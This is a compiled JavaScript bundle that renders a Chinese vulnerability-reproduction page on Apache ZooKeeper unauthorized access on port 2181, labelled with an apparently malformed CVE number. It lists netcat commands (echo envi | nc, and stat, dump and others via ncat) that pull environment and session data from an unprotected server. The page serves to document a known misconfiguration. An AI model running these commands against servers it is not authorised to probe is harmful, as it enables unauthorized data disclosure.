(window.webpackJsonp=window.webpackJsonp||[]).push([[431],{2188:function(s,a,e){s.exports=e.p+"assets/img/98517179-604b-45d3-8f08-88ac223c1dd7.f611bd86.png"},2649:function(s,a,e){"use strict";e.r(a);var t=e(75),n=Object(t.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"apache-zookeeper-未授权访问漏洞-cve-2014-085"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#apache-zookeeper-未授权访问漏洞-cve-2014-085"}},[s._v("#")]),s._v(" Apache ZooKeeper 未授权访问漏洞 CVE-2014-085")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Apache ZooKeeper")]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("Apache  ZooKeeper 默认开放"),t("code",[s._v("2181端口")]),s._v(" ,使用如下命令获取敏感数据")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" envi "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" xxx.xxx.xxx.xxx "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:e(2188),alt:"98517179-604b-45d3-8f08-88ac223c1dd7"}})]),s._v(" "),t("p",[s._v("其他信息")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("、stat：列出关于性能和连接的客户端的统计信息。\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("stat")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("、ruok：测试服务器是否运行在非错误状态。\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" ruok "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("、reqs：列出未完成的请求。\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" reqs "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n　　\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("、envi：打印有关服务环境的详细信息。\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" envi "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n　　\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("、dump：列出未完成的会话和临时节点。\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" dump "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])])],1)}),[],!1,null,null,null);a.default=n.exports}}]);